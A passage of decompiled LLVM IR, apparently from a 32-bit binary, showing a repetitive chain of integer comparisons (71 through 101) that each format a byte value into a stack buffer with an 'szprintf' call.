  %v0_804adef = load i8, i8* @global_var_805b559.40, align 1
  %v1_804adef = zext i8 %v0_804adef to i32
  %v2_804adfe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adfe, i32* @ebx, align 4
  %v4_804ae10 = call i32 @szprintf(i32 %v2_804adfe, i32 ptrtoint ([14 x i8]* @global_var_80587e0.110 to i32), i32 %v1_804adef)
  br label %dec_label_pc_804ae15

dec_label_pc_804ae15:                             ; preds = %dec_label_pc_804addf, %dec_label_pc_804ade5
  %v13_804ae15 = icmp eq i32 %v2_8049efa, 71
  %v1_804ae19 = icmp eq i1 %v13_804ae15, false
  br i1 %v1_804ae19, label %dec_label_pc_804ae4b, label %dec_label_pc_804ae1b

dec_label_pc_804ae1b:                             ; preds = %dec_label_pc_804ae15
  %v0_804ae1b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ae1b = zext i8 %v0_804ae1b to i32
  store i32 %v1_804ae1b, i32* @edx, align 4
  %v0_804ae25 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ae25 = zext i8 %v0_804ae25 to i32
  %v2_804ae34 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae34, i32* @ebx, align 4
  %v4_804ae46 = call i32 @szprintf(i32 %v2_804ae34, i32 ptrtoint ([14 x i8]* @global_var_80587ee.111 to i32), i32 %v1_804ae25)
  br label %dec_label_pc_804ae4b

dec_label_pc_804ae4b:                             ; preds = %dec_label_pc_804ae15, %dec_label_pc_804ae1b
  %v13_804ae4b = icmp eq i32 %v2_8049efa, 72
  %v1_804ae4f = icmp eq i1 %v13_804ae4b, false
  br i1 %v1_804ae4f, label %dec_label_pc_804ae81, label %dec_label_pc_804ae51

dec_label_pc_804ae51:                             ; preds = %dec_label_pc_804ae4b
  %v0_804ae51 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ae51 = zext i8 %v0_804ae51 to i32
  store i32 %v1_804ae51, i32* @edx, align 4
  %v0_804ae5b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ae5b = zext i8 %v0_804ae5b to i32
  %v2_804ae6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6a, i32* @ebx, align 4
  %v4_804ae7c = call i32 @szprintf(i32 %v2_804ae6a, i32 ptrtoint ([14 x i8]* @global_var_80587fc.112 to i32), i32 %v1_804ae5b)
  br label %dec_label_pc_804ae81

dec_label_pc_804ae81:                             ; preds = %dec_label_pc_804ae4b, %dec_label_pc_804ae51
  %v13_804ae81 = icmp eq i32 %v2_8049efa, 73
  %v1_804ae85 = icmp eq i1 %v13_804ae81, false
  br i1 %v1_804ae85, label %dec_label_pc_804aeb7, label %dec_label_pc_804ae87

dec_label_pc_804ae87:                             ; preds = %dec_label_pc_804ae81
  %v0_804ae87 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ae87 = zext i8 %v0_804ae87 to i32
  store i32 %v1_804ae87, i32* @edx, align 4
  %v0_804ae91 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ae91 = zext i8 %v0_804ae91 to i32
  %v2_804aea0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aea0, i32* @ebx, align 4
  %v4_804aeb2 = call i32 @szprintf(i32 %v2_804aea0, i32 ptrtoint ([14 x i8]* @global_var_805880a.113 to i32), i32 %v1_804ae91)
  br label %dec_label_pc_804aeb7

dec_label_pc_804aeb7:                             ; preds = %dec_label_pc_804ae81, %dec_label_pc_804ae87
  %v13_804aeb7 = icmp eq i32 %v2_8049efa, 74
  %v1_804aebb = icmp eq i1 %v13_804aeb7, false
  br i1 %v1_804aebb, label %dec_label_pc_804aeed, label %dec_label_pc_804aebd

dec_label_pc_804aebd:                             ; preds = %dec_label_pc_804aeb7
  %v0_804aebd = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aebd = zext i8 %v0_804aebd to i32
  store i32 %v1_804aebd, i32* @edx, align 4
  %v0_804aec7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aec7 = zext i8 %v0_804aec7 to i32
  %v2_804aed6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aed6, i32* @ebx, align 4
  %v4_804aee8 = call i32 @szprintf(i32 %v2_804aed6, i32 ptrtoint ([14 x i8]* @global_var_8058818.114 to i32), i32 %v1_804aec7)
  br label %dec_label_pc_804aeed

dec_label_pc_804aeed:                             ; preds = %dec_label_pc_804aeb7, %dec_label_pc_804aebd
  %v13_804aeed = icmp eq i32 %v2_8049efa, 75
  %v1_804aef1 = icmp eq i1 %v13_804aeed, false
  br i1 %v1_804aef1, label %dec_label_pc_804af23, label %dec_label_pc_804aef3

dec_label_pc_804aef3:                             ; preds = %dec_label_pc_804aeed
  %v0_804aef3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aef3 = zext i8 %v0_804aef3 to i32
  store i32 %v1_804aef3, i32* @edx, align 4
  %v0_804aefd = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aefd = zext i8 %v0_804aefd to i32
  %v2_804af0c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af0c, i32* @ebx, align 4
  %v4_804af1e = call i32 @szprintf(i32 %v2_804af0c, i32 ptrtoint ([14 x i8]* @global_var_805880a.113 to i32), i32 %v1_804aefd)
  br label %dec_label_pc_804af23

dec_label_pc_804af23:                             ; preds = %dec_label_pc_804aeed, %dec_label_pc_804aef3
  %v13_804af23 = icmp eq i32 %v2_8049efa, 76
  %v1_804af27 = icmp eq i1 %v13_804af23, false
  br i1 %v1_804af27, label %dec_label_pc_804af59, label %dec_label_pc_804af29

dec_label_pc_804af29:                             ; preds = %dec_label_pc_804af23
  %v0_804af29 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804af29 = zext i8 %v0_804af29 to i32
  store i32 %v1_804af29, i32* @edx, align 4
  %v0_804af33 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804af33 = zext i8 %v0_804af33 to i32
  %v2_804af42 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af42, i32* @ebx, align 4
  %v4_804af54 = call i32 @szprintf(i32 %v2_804af42, i32 ptrtoint ([15 x i8]* @global_var_8058826.115 to i32), i32 %v1_804af33)
  br label %dec_label_pc_804af59

dec_label_pc_804af59:                             ; preds = %dec_label_pc_804af23, %dec_label_pc_804af29
  %v13_804af59 = icmp eq i32 %v2_8049efa, 77
  %v1_804af5d = icmp eq i1 %v13_804af59, false
  br i1 %v1_804af5d, label %dec_label_pc_804af8f, label %dec_label_pc_804af5f

dec_label_pc_804af5f:                             ; preds = %dec_label_pc_804af59
  %v0_804af5f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804af5f = zext i8 %v0_804af5f to i32
  store i32 %v1_804af5f, i32* @edx, align 4
  %v0_804af69 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804af69 = zext i8 %v0_804af69 to i32
  %v2_804af78 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af78, i32* @ebx, align 4
  %v4_804af8a = call i32 @szprintf(i32 %v2_804af78, i32 ptrtoint ([14 x i8]* @global_var_8058835.116 to i32), i32 %v1_804af69)
  br label %dec_label_pc_804af8f

dec_label_pc_804af8f:                             ; preds = %dec_label_pc_804af59, %dec_label_pc_804af5f
  %v13_804af8f = icmp eq i32 %v2_8049efa, 78
  %v1_804af93 = icmp eq i1 %v13_804af8f, false
  br i1 %v1_804af93, label %dec_label_pc_804afc5, label %dec_label_pc_804af95

dec_label_pc_804af95:                             ; preds = %dec_label_pc_804af8f
  %v0_804af95 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804af95 = zext i8 %v0_804af95 to i32
  store i32 %v1_804af95, i32* @edx, align 4
  %v0_804af9f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804af9f = zext i8 %v0_804af9f to i32
  %v2_804afae = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afae, i32* @ebx, align 4
  %v4_804afc0 = call i32 @szprintf(i32 %v2_804afae, i32 ptrtoint ([14 x i8]* @global_var_8058843.117 to i32), i32 %v1_804af9f)
  br label %dec_label_pc_804afc5

dec_label_pc_804afc5:                             ; preds = %dec_label_pc_804af8f, %dec_label_pc_804af95
  %v13_804afc5 = icmp eq i32 %v2_8049efa, 79
  %v1_804afc9 = icmp eq i1 %v13_804afc5, false
  br i1 %v1_804afc9, label %dec_label_pc_804affb, label %dec_label_pc_804afcb

dec_label_pc_804afcb:                             ; preds = %dec_label_pc_804afc5
  %v0_804afcb = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804afcb = zext i8 %v0_804afcb to i32
  store i32 %v1_804afcb, i32* @edx, align 4
  %v0_804afd5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804afd5 = zext i8 %v0_804afd5 to i32
  %v2_804afe4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afe4, i32* @ebx, align 4
  %v4_804aff6 = call i32 @szprintf(i32 %v2_804afe4, i32 ptrtoint ([16 x i8]* @global_var_8058851.118 to i32), i32 %v1_804afd5)
  br label %dec_label_pc_804affb

dec_label_pc_804affb:                             ; preds = %dec_label_pc_804afc5, %dec_label_pc_804afcb
  %v10_804affb = icmp eq i32 %v2_8049efa, 80
  %v1_804afff = icmp eq i1 %v10_804affb, false
  br i1 %v1_804afff, label %dec_label_pc_804b031, label %dec_label_pc_804b001

dec_label_pc_804b001:                             ; preds = %dec_label_pc_804affb
  %v0_804b001 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b001 = zext i8 %v0_804b001 to i32
  store i32 %v1_804b001, i32* @edx, align 4
  %v0_804b00b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b00b = zext i8 %v0_804b00b to i32
  %v2_804b01a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01a, i32* @ebx, align 4
  %v4_804b02c = call i32 @szprintf(i32 %v2_804b01a, i32 ptrtoint ([14 x i8]* @global_var_8058861.119 to i32), i32 %v1_804b00b)
  br label %dec_label_pc_804b031

dec_label_pc_804b031:                             ; preds = %dec_label_pc_804affb, %dec_label_pc_804b001
  %v13_804b031 = icmp eq i32 %v2_8049efa, 81
  %v1_804b035 = icmp eq i1 %v13_804b031, false
  br i1 %v1_804b035, label %dec_label_pc_804b067, label %dec_label_pc_804b037

dec_label_pc_804b037:                             ; preds = %dec_label_pc_804b031
  %v0_804b037 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b037 = zext i8 %v0_804b037 to i32
  store i32 %v1_804b037, i32* @edx, align 4
  %v0_804b041 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b041 = zext i8 %v0_804b041 to i32
  %v2_804b050 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b050, i32* @ebx, align 4
  %v4_804b062 = call i32 @szprintf(i32 %v2_804b050, i32 ptrtoint ([14 x i8]* @global_var_805886f.120 to i32), i32 %v1_804b041)
  br label %dec_label_pc_804b067

dec_label_pc_804b067:                             ; preds = %dec_label_pc_804b031, %dec_label_pc_804b037
  %v13_804b067 = icmp eq i32 %v2_8049efa, 82
  %v1_804b06b = icmp eq i1 %v13_804b067, false
  br i1 %v1_804b06b, label %dec_label_pc_804b09d, label %dec_label_pc_804b06d

dec_label_pc_804b06d:                             ; preds = %dec_label_pc_804b067
  %v0_804b06d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b06d = zext i8 %v0_804b06d to i32
  store i32 %v1_804b06d, i32* @edx, align 4
  %v0_804b077 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b077 = zext i8 %v0_804b077 to i32
  %v2_804b086 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b086, i32* @ebx, align 4
  %v4_804b098 = call i32 @szprintf(i32 %v2_804b086, i32 ptrtoint ([14 x i8]* @global_var_805887d.121 to i32), i32 %v1_804b077)
  br label %dec_label_pc_804b09d

dec_label_pc_804b09d:                             ; preds = %dec_label_pc_804b067, %dec_label_pc_804b06d
  %v13_804b09d = icmp eq i32 %v2_8049efa, 83
  %v1_804b0a1 = icmp eq i1 %v13_804b09d, false
  br i1 %v1_804b0a1, label %dec_label_pc_804b0d3, label %dec_label_pc_804b0a3

dec_label_pc_804b0a3:                             ; preds = %dec_label_pc_804b09d
  %v0_804b0a3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b0a3 = zext i8 %v0_804b0a3 to i32
  store i32 %v1_804b0a3, i32* @edx, align 4
  %v0_804b0ad = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b0ad = zext i8 %v0_804b0ad to i32
  %v2_804b0bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0bc, i32* @ebx, align 4
  %v4_804b0ce = call i32 @szprintf(i32 %v2_804b0bc, i32 ptrtoint ([15 x i8]* @global_var_805888b.122 to i32), i32 %v1_804b0ad)
  br label %dec_label_pc_804b0d3

dec_label_pc_804b0d3:                             ; preds = %dec_label_pc_804b09d, %dec_label_pc_804b0a3
  %v13_804b0d3 = icmp eq i32 %v2_8049efa, 84
  %v1_804b0d7 = icmp eq i1 %v13_804b0d3, false
  br i1 %v1_804b0d7, label %dec_label_pc_804b109, label %dec_label_pc_804b0d9

dec_label_pc_804b0d9:                             ; preds = %dec_label_pc_804b0d3
  %v0_804b0d9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b0d9 = zext i8 %v0_804b0d9 to i32
  store i32 %v1_804b0d9, i32* @edx, align 4
  %v0_804b0e3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b0e3 = zext i8 %v0_804b0e3 to i32
  %v2_804b0f2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0f2, i32* @ebx, align 4
  %v4_804b104 = call i32 @szprintf(i32 %v2_804b0f2, i32 ptrtoint ([14 x i8]* @global_var_805889a.123 to i32), i32 %v1_804b0e3)
  br label %dec_label_pc_804b109

dec_label_pc_804b109:                             ; preds = %dec_label_pc_804b0d3, %dec_label_pc_804b0d9
  %v13_804b109 = icmp eq i32 %v2_8049efa, 85
  %v1_804b10d = icmp eq i1 %v13_804b109, false
  br i1 %v1_804b10d, label %dec_label_pc_804b13f, label %dec_label_pc_804b10f

dec_label_pc_804b10f:                             ; preds = %dec_label_pc_804b109
  %v0_804b10f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b10f = zext i8 %v0_804b10f to i32
  store i32 %v1_804b10f, i32* @edx, align 4
  %v0_804b119 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b119 = zext i8 %v0_804b119 to i32
  %v2_804b128 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b128, i32* @ebx, align 4
  %v4_804b13a = call i32 @szprintf(i32 %v2_804b128, i32 ptrtoint ([14 x i8]* @global_var_80588a8.124 to i32), i32 %v1_804b119)
  br label %dec_label_pc_804b13f

dec_label_pc_804b13f:                             ; preds = %dec_label_pc_804b109, %dec_label_pc_804b10f
  %v13_804b13f = icmp eq i32 %v2_8049efa, 86
  %v1_804b143 = icmp eq i1 %v13_804b13f, false
  br i1 %v1_804b143, label %dec_label_pc_804b175, label %dec_label_pc_804b145

dec_label_pc_804b145:                             ; preds = %dec_label_pc_804b13f
  %v0_804b145 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b145 = zext i8 %v0_804b145 to i32
  store i32 %v1_804b145, i32* @edx, align 4
  %v0_804b14f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b14f = zext i8 %v0_804b14f to i32
  %v2_804b15e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b15e, i32* @ebx, align 4
  %v4_804b170 = call i32 @szprintf(i32 %v2_804b15e, i32 ptrtoint ([14 x i8]* @global_var_80588b6.125 to i32), i32 %v1_804b14f)
  br label %dec_label_pc_804b175

dec_label_pc_804b175:                             ; preds = %dec_label_pc_804b13f, %dec_label_pc_804b145
  %v13_804b175 = icmp eq i32 %v2_8049efa, 87
  %v1_804b179 = icmp eq i1 %v13_804b175, false
  br i1 %v1_804b179, label %dec_label_pc_804b1ab, label %dec_label_pc_804b17b

dec_label_pc_804b17b:                             ; preds = %dec_label_pc_804b175
  %v0_804b17b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b17b = zext i8 %v0_804b17b to i32
  store i32 %v1_804b17b, i32* @edx, align 4
  %v0_804b185 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b185 = zext i8 %v0_804b185 to i32
  %v2_804b194 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b194, i32* @ebx, align 4
  %v4_804b1a6 = call i32 @szprintf(i32 %v2_804b194, i32 ptrtoint ([14 x i8]* @global_var_80588c4.126 to i32), i32 %v1_804b185)
  br label %dec_label_pc_804b1ab

dec_label_pc_804b1ab:                             ; preds = %dec_label_pc_804b175, %dec_label_pc_804b17b
  %v13_804b1ab = icmp eq i32 %v2_8049efa, 88
  %v1_804b1af = icmp eq i1 %v13_804b1ab, false
  br i1 %v1_804b1af, label %dec_label_pc_804b1e1, label %dec_label_pc_804b1b1

dec_label_pc_804b1b1:                             ; preds = %dec_label_pc_804b1ab
  %v0_804b1b1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b1b1 = zext i8 %v0_804b1b1 to i32
  store i32 %v1_804b1b1, i32* @edx, align 4
  %v0_804b1bb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b1bb = zext i8 %v0_804b1bb to i32
  %v2_804b1ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1ca, i32* @ebx, align 4
  %v4_804b1dc = call i32 @szprintf(i32 %v2_804b1ca, i32 ptrtoint ([14 x i8]* @global_var_80588d2.127 to i32), i32 %v1_804b1bb)
  br label %dec_label_pc_804b1e1

dec_label_pc_804b1e1:                             ; preds = %dec_label_pc_804b1ab, %dec_label_pc_804b1b1
  %v13_804b1e1 = icmp eq i32 %v2_8049efa, 89
  %v1_804b1e5 = icmp eq i1 %v13_804b1e1, false
  br i1 %v1_804b1e5, label %dec_label_pc_804b217, label %dec_label_pc_804b1e7

dec_label_pc_804b1e7:                             ; preds = %dec_label_pc_804b1e1
  %v0_804b1e7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b1e7 = zext i8 %v0_804b1e7 to i32
  store i32 %v1_804b1e7, i32* @edx, align 4
  %v0_804b1f1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b1f1 = zext i8 %v0_804b1f1 to i32
  %v2_804b200 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b200, i32* @ebx, align 4
  %v4_804b212 = call i32 @szprintf(i32 %v2_804b200, i32 ptrtoint ([14 x i8]* @global_var_80588e0.128 to i32), i32 %v1_804b1f1)
  br label %dec_label_pc_804b217

dec_label_pc_804b217:                             ; preds = %dec_label_pc_804b1e1, %dec_label_pc_804b1e7
  %v13_804b217 = icmp eq i32 %v2_8049efa, 90
  %v1_804b21b = icmp eq i1 %v13_804b217, false
  br i1 %v1_804b21b, label %dec_label_pc_804b24d, label %dec_label_pc_804b21d

dec_label_pc_804b21d:                             ; preds = %dec_label_pc_804b217
  %v0_804b21d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b21d = zext i8 %v0_804b21d to i32
  store i32 %v1_804b21d, i32* @edx, align 4
  %v0_804b227 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b227 = zext i8 %v0_804b227 to i32
  %v2_804b236 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b236, i32* @ebx, align 4
  %v4_804b248 = call i32 @szprintf(i32 %v2_804b236, i32 ptrtoint ([13 x i8]* @global_var_80588ee.129 to i32), i32 %v1_804b227)
  br label %dec_label_pc_804b24d

dec_label_pc_804b24d:                             ; preds = %dec_label_pc_804b217, %dec_label_pc_804b21d
  %v13_804b24d = icmp eq i32 %v2_8049efa, 91
  %v1_804b251 = icmp eq i1 %v13_804b24d, false
  br i1 %v1_804b251, label %dec_label_pc_804b283, label %dec_label_pc_804b253

dec_label_pc_804b253:                             ; preds = %dec_label_pc_804b24d
  %v0_804b253 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b253 = zext i8 %v0_804b253 to i32
  store i32 %v1_804b253, i32* @edx, align 4
  %v0_804b25d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b25d = zext i8 %v0_804b25d to i32
  %v2_804b26c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b26c, i32* @ebx, align 4
  %v4_804b27e = call i32 @szprintf(i32 %v2_804b26c, i32 ptrtoint ([13 x i8]* @global_var_80588fb.130 to i32), i32 %v1_804b25d)
  br label %dec_label_pc_804b283

dec_label_pc_804b283:                             ; preds = %dec_label_pc_804b24d, %dec_label_pc_804b253
  %v13_804b283 = icmp eq i32 %v2_8049efa, 92
  %v1_804b287 = icmp eq i1 %v13_804b283, false
  br i1 %v1_804b287, label %dec_label_pc_804b2b9, label %dec_label_pc_804b289

dec_label_pc_804b289:                             ; preds = %dec_label_pc_804b283
  %v0_804b289 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b289 = zext i8 %v0_804b289 to i32
  store i32 %v1_804b289, i32* @edx, align 4
  %v0_804b293 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b293 = zext i8 %v0_804b293 to i32
  %v2_804b2a2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2a2, i32* @ebx, align 4
  %v4_804b2b4 = call i32 @szprintf(i32 %v2_804b2a2, i32 ptrtoint ([13 x i8]* @global_var_8058908.131 to i32), i32 %v1_804b293)
  br label %dec_label_pc_804b2b9

dec_label_pc_804b2b9:                             ; preds = %dec_label_pc_804b283, %dec_label_pc_804b289
  %v13_804b2b9 = icmp eq i32 %v2_8049efa, 93
  %v1_804b2bd = icmp eq i1 %v13_804b2b9, false
  br i1 %v1_804b2bd, label %dec_label_pc_804b2ef, label %dec_label_pc_804b2bf

dec_label_pc_804b2bf:                             ; preds = %dec_label_pc_804b2b9
  %v0_804b2bf = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b2bf = zext i8 %v0_804b2bf to i32
  store i32 %v1_804b2bf, i32* @edx, align 4
  %v0_804b2c9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b2c9 = zext i8 %v0_804b2c9 to i32
  %v2_804b2d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2d8, i32* @ebx, align 4
  %v4_804b2ea = call i32 @szprintf(i32 %v2_804b2d8, i32 ptrtoint ([13 x i8]* @global_var_8058915.132 to i32), i32 %v1_804b2c9)
  br label %dec_label_pc_804b2ef

dec_label_pc_804b2ef:                             ; preds = %dec_label_pc_804b2b9, %dec_label_pc_804b2bf
  %v13_804b2ef = icmp eq i32 %v2_8049efa, 94
  %v1_804b2f3 = icmp eq i1 %v13_804b2ef, false
  br i1 %v1_804b2f3, label %dec_label_pc_804b325, label %dec_label_pc_804b2f5

dec_label_pc_804b2f5:                             ; preds = %dec_label_pc_804b2ef
  %v0_804b2f5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b2f5 = zext i8 %v0_804b2f5 to i32
  store i32 %v1_804b2f5, i32* @edx, align 4
  %v0_804b2ff = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b2ff = zext i8 %v0_804b2ff to i32
  %v2_804b30e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b30e, i32* @ebx, align 4
  %v4_804b320 = call i32 @szprintf(i32 %v2_804b30e, i32 ptrtoint ([13 x i8]* @global_var_805866e.83 to i32), i32 %v1_804b2ff)
  br label %dec_label_pc_804b325

dec_label_pc_804b325:                             ; preds = %dec_label_pc_804b2ef, %dec_label_pc_804b2f5
  %v13_804b325 = icmp eq i32 %v2_8049efa, 95
  %v1_804b329 = icmp eq i1 %v13_804b325, false
  br i1 %v1_804b329, label %dec_label_pc_804b35b, label %dec_label_pc_804b32b

dec_label_pc_804b32b:                             ; preds = %dec_label_pc_804b325
  %v0_804b32b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b32b = zext i8 %v0_804b32b to i32
  store i32 %v1_804b32b, i32* @edx, align 4
  %v0_804b335 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b335 = zext i8 %v0_804b335 to i32
  %v2_804b344 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b344, i32* @ebx, align 4
  %v4_804b356 = call i32 @szprintf(i32 %v2_804b344, i32 ptrtoint ([13 x i8]* @global_var_8058922.133 to i32), i32 %v1_804b335)
  br label %dec_label_pc_804b35b

dec_label_pc_804b35b:                             ; preds = %dec_label_pc_804b325, %dec_label_pc_804b32b
  %v10_804b35b = icmp eq i32 %v2_8049efa, 96
  %v1_804b35f = icmp eq i1 %v10_804b35b, false
  br i1 %v1_804b35f, label %dec_label_pc_804b391, label %dec_label_pc_804b361

dec_label_pc_804b361:                             ; preds = %dec_label_pc_804b35b
  %v0_804b361 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b361 = zext i8 %v0_804b361 to i32
  store i32 %v1_804b361, i32* @edx, align 4
  %v0_804b36b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b36b = zext i8 %v0_804b36b to i32
  %v2_804b37a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b37a, i32* @ebx, align 4
  %v4_804b38c = call i32 @szprintf(i32 %v2_804b37a, i32 ptrtoint ([13 x i8]* @global_var_8058695.86 to i32), i32 %v1_804b36b)
  br label %dec_label_pc_804b391

dec_label_pc_804b391:                             ; preds = %dec_label_pc_804b35b, %dec_label_pc_804b361
  %v13_804b391 = icmp eq i32 %v2_8049efa, 97
  %v1_804b395 = icmp eq i1 %v13_804b391, false
  br i1 %v1_804b395, label %dec_label_pc_804b3c7, label %dec_label_pc_804b397

dec_label_pc_804b397:                             ; preds = %dec_label_pc_804b391
  %v0_804b397 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b397 = zext i8 %v0_804b397 to i32
  store i32 %v1_804b397, i32* @edx, align 4
  %v0_804b3a1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b3a1 = zext i8 %v0_804b3a1 to i32
  %v2_804b3b0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3b0, i32* @ebx, align 4
  %v4_804b3c2 = call i32 @szprintf(i32 %v2_804b3b0, i32 ptrtoint ([14 x i8]* @global_var_80587fc.112 to i32), i32 %v1_804b3a1)
  br label %dec_label_pc_804b3c7

dec_label_pc_804b3c7:                             ; preds = %dec_label_pc_804b391, %dec_label_pc_804b397
  %v13_804b3c7 = icmp eq i32 %v2_8049efa, 98
  %v1_804b3cb = icmp eq i1 %v13_804b3c7, false
  br i1 %v1_804b3cb, label %dec_label_pc_804b3fd, label %dec_label_pc_804b3cd

dec_label_pc_804b3cd:                             ; preds = %dec_label_pc_804b3c7
  %v0_804b3cd = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b3cd = zext i8 %v0_804b3cd to i32
  store i32 %v1_804b3cd, i32* @edx, align 4
  %v0_804b3d7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b3d7 = zext i8 %v0_804b3d7 to i32
  %v2_804b3e6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3e6, i32* @ebx, align 4
  %v4_804b3f8 = call i32 @szprintf(i32 %v2_804b3e6, i32 ptrtoint ([13 x i8]* @global_var_805892f.134 to i32), i32 %v1_804b3d7)
  br label %dec_label_pc_804b3fd

dec_label_pc_804b3fd:                             ; preds = %dec_label_pc_804b3c7, %dec_label_pc_804b3cd
  %v13_804b3fd = icmp eq i32 %v2_8049efa, 99
  %v1_804b401 = icmp eq i1 %v13_804b3fd, false
  br i1 %v1_804b401, label %dec_label_pc_804b433, label %dec_label_pc_804b403

dec_label_pc_804b403:                             ; preds = %dec_label_pc_804b3fd
  %v0_804b403 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b403 = zext i8 %v0_804b403 to i32
  store i32 %v1_804b403, i32* @edx, align 4
  %v0_804b40d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b40d = zext i8 %v0_804b40d to i32
  %v2_804b41c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b41c, i32* @ebx, align 4
  %v4_804b42e = call i32 @szprintf(i32 %v2_804b41c, i32 ptrtoint ([14 x i8]* @global_var_805893c.135 to i32), i32 %v1_804b40d)
  br label %dec_label_pc_804b433

dec_label_pc_804b433:                             ; preds = %dec_label_pc_804b3fd, %dec_label_pc_804b403
  %v13_804b433 = icmp eq i32 %v2_8049efa, 100
  %v1_804b437 = icmp eq i1 %v13_804b433, false
  br i1 %v1_804b437, label %dec_label_pc_804b469, label %dec_label_pc_804b439

dec_label_pc_804b439:                             ; preds = %dec_label_pc_804b433
  %v0_804b439 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b439 = zext i8 %v0_804b439 to i32
  store i32 %v1_804b439, i32* @edx, align 4
  %v0_804b443 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b443 = zext i8 %v0_804b443 to i32
  %v2_804b452 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b452, i32* @ebx, align 4
  %v4_804b464 = call i32 @szprintf(i32 %v2_804b452, i32 ptrtoint ([14 x i8]* @global_var_805894a.136 to i32), i32 %v1_804b443)
  br label %dec_label_pc_804b469

dec_label_pc_804b469:                             ; preds = %dec_label_pc_804b433, %dec_label_pc_804b439
  %v13_804b469 = icmp eq i32 %v2_8049efa, 101
  %v1_804b46d = icmp eq i1 %v13_804b469, false
  br i1 %v1_804b46d, label %dec_label_pc_804b49f, label %dec_label_pc_804b46f

dec_label_pc_804b46f:                             ; preds = %dec_label_pc_804b469
